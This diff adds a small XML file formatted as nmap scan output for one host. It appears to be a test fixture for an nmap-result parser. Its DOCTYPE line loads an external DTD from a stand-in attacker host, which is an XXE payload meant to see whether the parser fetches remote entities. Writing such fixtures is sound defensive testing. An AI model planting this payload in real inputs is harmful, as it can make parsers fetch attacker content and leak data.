@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE nmaprun SYSTEM "http://attacker.example/evil.dtd">
+<nmaprun scanner="nmap" args="nmap -sV -oX - 172.20.1.1" start="1700000000">
+<host><status state="up" reason="syn-ack" reason_ttl="64"/>
+<address addr="172.20.1.1" addrtype="ipv4"/>
+</host>
+</nmaprun>
